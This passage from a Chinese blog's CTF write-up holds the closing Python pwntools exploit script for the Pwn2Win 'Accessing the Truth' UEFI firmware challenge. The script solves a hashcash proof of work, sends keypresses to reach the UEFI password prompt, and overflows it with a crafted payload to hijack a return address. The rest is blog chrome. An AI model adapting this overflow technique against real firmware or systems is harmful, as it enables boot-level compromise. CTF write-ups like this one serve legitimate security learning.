class="string">"-s"</span>, <span class="string">"-m"</span>, <span class="string">"64M"</span>, <span class="string">"-drive"</span>, <span class="string">"if=pflash,format=raw,file="</span>+fname, <span class="string">"-drive"</span>,</span><br><span class="line">                    <span class="string">"file=fat:rw:contents,format=raw"</span>, <span class="string">"-net"</span>, <span class="string">"none"</span>, <span class="string">"-nographic"</span>], env=&#123;&#125;)</span><br><span class="line"><span class="keyword">elif</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">'accessing-the-truth.pwn2win.party'</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_pow</span><span class="params">()</span>:</span></span><br><span class="line">    p.ru(<span class="string">'hashcash -mb25'</span>)</span><br><span class="line">    hash = p.rl().strip()</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">'hashcash -mb25 '</span>+hash.decode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">    res = os.popen(cmd)</span><br><span class="line">    cash = res.read()</span><br><span class="line">    res.close()</span><br><span class="line"></span><br><span class="line">    p.sa(<span class="string">'Solution:'</span>, cash)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    pass_pow()</span><br><span class="line"></span><br><span class="line">    p.rn(<span class="number">1</span>)</span><br><span class="line">    p.s(<span class="string">'\x1b[24~'</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#p.sa('Password', 'A'*2+'\n'*2+'B'*0x18+'\r')</span></span><br><span class="line">    <span class="comment">#payload = 'A'*2+'\n'*2+'B'*0x18+'\r'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#payload = b'\n'*0xa8 + p32(0xdeadbeaf)</span></span><br><span class="line">    <span class="comment">#payload += b'\r'</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b'\n'</span>*<span class="number">0xa8</span> + p32(<span class="number">0x28b0dd5</span>)</span><br><span class="line">    payload += <span class="string">b'\r'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    p.sa(<span class="string">'Password'</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'\r'</span></span><br><span class="line">    p.s(payload)</span><br><span class="line">    p.s(payload)</span><br><span class="line"></span><br><span class="line">    p.irt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/06/26/%E8%A7%A3%E5%86%B3%E7%AC%AC%E4%B8%80%E4%B8%AAUEFI-PWN%E2%80%94%E2%80%94Accessing-the-Truth%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="leancloud-visitors view" data-flag-title="解决第一个UEFI PWN——Accessing the Truth解题思路">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/06/26/PWN掉一款小型开源OS——续篇：内核态PWN/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-06-26 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/BIOS/">BIOS<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/解题思路/">解题思路<span>8</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#题目分析"><span class="toc-article-text">题目分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#解开OVMF"><span class="toc-article-text">解开OVMF</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#定位到UiApp"><span class="toc-article-text">定位到UiApp</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#静态分析"><span class="toc-article-text">静态分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Debug"><span class="toc-article-text">Debug</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Hijack-to-BIOS-Booting"><span class="toc-article-text">Hijack to BIOS Booting</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Script"><span class="toc-article-text">Script</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 sung3r's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
